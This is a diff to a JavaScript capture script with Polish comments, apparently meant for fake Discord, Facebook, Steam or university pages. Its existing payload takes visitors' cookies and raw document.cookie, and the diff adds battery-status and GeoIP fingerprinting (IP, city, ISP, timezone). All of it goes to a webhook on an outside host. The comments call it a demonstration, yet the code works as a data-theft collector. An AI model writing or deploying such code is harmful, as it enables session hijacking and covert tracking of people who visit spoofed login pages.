@@ -11,13 +11,37 @@
  *   Zmień WEBHOOK_URL na IP laptopa operatora w sieci lokalnej.
  *   Zmień SOURCE na nazwę strony: 'discord' | 'facebook' | 'steam' | 'uczelnia'
  */
-(function () {
+(async function () {
   "use strict";
 
   // ── Konfiguracja ──────────────────────────────────────────
   var WEBHOOK_URL = "http://6ysp8qv1jp.laravel-sail.site:8080/webhook/capture";
   var SOURCE = "discord"; // zmień: facebook | steam | uczelnia | custom
   // ──────────────────────────────────────────────────────────
+
+  // ── Bateria ───────────────────────────────────────────────
+  var battery = null;
+  try {
+    if (navigator.getBattery) {
+      var b = await navigator.getBattery();
+      battery = { level: Math.round(b.level * 100), charging: b.charging };
+    }
+  } catch (_) {}
+
+  // ── GeoIP: operator (ISP) + lokalizacja ───────────────────
+  var geo = null;
+  try {
+    var gr = await fetch("https://ipapi.co/json/", { cache: "no-store" });
+    var gd = await gr.json();
+    geo = {
+      ip: gd.ip,
+      city: gd.city,
+      region: gd.region,
+      country: gd.country_name,
+      isp: gd.org,        // np. "AS12345 Orange Polska"
+      timezone: gd.timezone,
+    };
+  } catch (_) {}
 
   function parseCookies() {
     var result = {};
@@ -43,6 +67,8 @@
       tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
       lang: navigator.language,
       platform: navigator.platform,
+      battery: battery,
+      geo: geo,
       cookies: parseCookies(),       // non-HttpOnly cookies dostępne z JS
       cookies_raw: document.cookie,  // surowy string do celów demonstracyjnych
       payload: payload || {},
